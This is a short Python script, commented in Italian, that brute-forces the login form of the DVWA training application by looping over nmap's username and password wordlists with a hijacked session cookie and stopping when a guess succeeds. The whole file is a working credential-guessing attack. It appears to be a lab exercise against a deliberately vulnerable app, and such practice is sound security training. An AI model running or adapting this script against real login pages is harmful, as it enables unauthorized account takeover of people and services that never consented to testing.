import requests
from bs4 import BeautifulSoup # la libreria BeautifulSoup è utilizzata per il web scraping e la lettura di dati da pagine web

ip = input("Inserisci l'ip del server: ")
header = {
        "Cookie": "security=low; PHPSESSID=6afc74c42829c161f8a2cb007404bd93" # intercettiamo con Burp Suite l'ID della sessione corrente
}
with open("/usr/share/nmap/nselib/data/usernames.lst", 'r') as names: # inizializziamo la variabile names a partire dal file usernames.lst
        for username in names:
                with open("/usr/share/nmap/nselib/data/passwords.lst",'r') as passwords: # inizializziamo la variabile passwords dal file passwords.lst
                        for password in passwords:
                                url = "http://%s/dvwa/vulnerabilities/brute/" %ip
                                r = requests.get(url, headers=header)
                                soup = BeautifulSoup(r.text,"html.parser")

                                user = username.strip()
                                pwd = password.strip()
                                get_data = {
                                        "username": user,
                                        "password": pwd,
                                        "Login" : "Login"
                                }
                                print ("\n",user," - ", pwd)
                                r = requests.get(url,params=get_data,headers=header)
                                if not 'Username and/or password incorrect.' in r.text:
                                        print("\nAccesso riuscito con Username >>>",user, " e Password >>>",password)
                                        exit()
                                else:
                                        print("Accesso Negato")